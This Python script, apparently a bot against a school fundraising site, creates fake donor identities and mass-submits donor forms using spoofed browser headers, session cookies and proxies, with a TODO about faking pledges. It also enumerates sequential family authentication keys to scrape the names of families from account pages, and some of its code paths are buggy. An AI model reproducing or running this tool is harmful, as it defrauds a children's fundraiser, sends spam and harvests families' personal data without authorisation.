"""
TODO:
Add temp mail.
Try to see if pledges can be faked.
Make it so that it somehow checks the email and makes it as viewed.
Proxies for makeUserAndSendEmail.
Make option 2 print better.
Random words to the end of the email.

NOTES:


"""

import requests
import aiohttp
import asyncio
import random
import json
import os

from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from fng_api import *

version = "0.0.1"
os.system("cls" if os.name == "nt" else "clear")
print(f"Step It Up Kids Bot v{version}")

with open("proxies.txt", "r") as f:
    proxies = [line.strip() for line in f]

with open("config.json") as config_file:
    config = json.load(config_file)

global domains, tempmail, tempmailkey, familyAuthKeys, schoolPath
domains = config["domains"]
tempmail = config["tempmail"]
tempmailkey = config["tempmailkey"]
familyAuthKeys = config["familyAuthKey"]
schoolPath = config["schoolPath"]

url = f"https://stepitupkids.com/{schoolPath}/"


async def makeUserAndSendEmail(familyAuthKey, domain):
    identity = getIdentity()
    name_parts = identity.name.split()
    firstname = name_parts[0]
    alias = firstname
    lastname = name_parts[-1]

    email = firstname + "." + lastname + "%40" + domain

    payload = f"Donors.CurrentKey=0&Donors.Current.FirstName={firstname}&Donors.Current.LastName={lastname}&Donors.Current.EmailAddress={email}&Donors.Current.CountryCode=1&Donors.Current.Mobile=&Donors.Current.Alias={alias}&Controller.Action=SendAdd&Controller.Actions.Save=Donors.Current.Save%3D&Controller.Actions.SendAdd=Donors.Current.SendRequest%3D&Controller.Actions.OptOut=Donors.Current.OptOut%3D"
    headers = {
        "authority": "stepitupkids.com",
        "accept": "text/html, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": f"googtrans=%2Fen%2Fen; FamilyAuthKey={familyAuthKey}; VisitorID=43805684",
        "dnt": "1",
        "origin": "https://stepitupkids.com",
        "referer": url,
        "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    userAddURL = url + "FAMILYDonorForm.html"

    async with aiohttp.ClientSession() as session:
        async with session.post(userAddURL, headers=headers, data=payload) as response:
            if response.status == 200:
                return response.status, firstname, familyAuthKey
            else:
                print("Request failed with status code:", response.status)
                return response.status, firstname, familyAuthKey, lastname


async def process_family_auth_keys(familyAuthKeys, domains):
    print("Sending requests...")
    random.shuffle(familyAuthKeys)
    random.shuffle(domains)
    tasks = [
        makeUserAndSendEmail(key, domain)
        for key, domain in zip(familyAuthKeys, domains)
    ]
    results = await asyncio.gather(*tasks)

    print(", ".join(f"{name}: {key}" for _, name, key in results))


def get_user_info(family_auth_key):
    session = requests.Session()

    proxy = random.choice(proxies)
    proxy_dict = {
        "http": "http://" + proxy,
    }

    cookies = {"FamilyAuthKey": str(family_auth_key)}
    response = session.get(
        url + "FAMILY-Account.html", cookies=cookies, proxies=proxy_dict
    )
    soup = BeautifulSoup(response.text, "html.parser")

    first_name_element = soup.find(id="FirstName")
    last_name_element = soup.find(id="LastName")

    return (
        first_name_element["value"] if first_name_element else "Not found",
        last_name_element["value"] if last_name_element else "Not found",
    )


def main():
    print("Choose an option:")
    print("1. Send emails.")
    print("2. Send email manually.")
    print("3. Send emails via temp-mail.")
    print("4. Send emails for a range of keys.")
    print("5. Get user info from family auth key.")
    print("6. Get user info from a range of family auth keys.")
    choice = input("Enter your choice: ")

    if choice == "1":
        times = int(input("Enter the number of times to run: "))
        for i in range(times):
            asyncio.run(process_family_auth_keys(familyAuthKeys, domains))
    elif choice == "2":
        times = int(input("Enter the number of times to run: "))
        familyAuthKey = [input("Enter the family auth key: ")]
        domain = [input("Enter the domain: ")]
        for i in range(times):
            asyncio.run(process_family_auth_keys(familyAuthKey, domain))
    elif choice == "3":
        print("Not implemented yet.")
    elif choice == "4":
        start = int(input("Enter the start number: "))
        end = int(input("Enter the end number: "))
        number_array = list(range(start, end + 1))
        results = asyncio.run(process_family_auth_keys(number_array, domains))
        for key, (first_name, last_name) in zip(number_array, results):
            nf_string = "Not found"
            if not (first_name == nf_string and last_name == nf_string):
                print(f"{first_name}, {last_name}, {key}")
    elif choice == "5":
        key = input("Enter the FamilyAuthKey: ")
        with ThreadPoolExecutor(max_workers=1) as executor:
            result = list(executor.map(get_user_info, [key]))
        first_name, last_name = result[0]
        print(f"{first_name}, {last_name}, {key}")
    elif choice == "6":
        start = int(input("Enter the start number: "))
        end = int(input("Enter the end number: "))
        family_auth_keys = list(range(start, end + 1))

        with ThreadPoolExecutor(
            max_workers=100
        ) as executor:  # Alter max_workers if you're facing any issues
            results = list(executor.map(get_user_info, family_auth_keys))

        for key, (first_name, last_name) in zip(family_auth_keys, results):
            nf_string = "Not found"
            if not (first_name == nf_string and last_name == nf_string):
                print(f"{first_name}, {last_name}, {key}")
    else:
        print("Invalid choice.")


main()
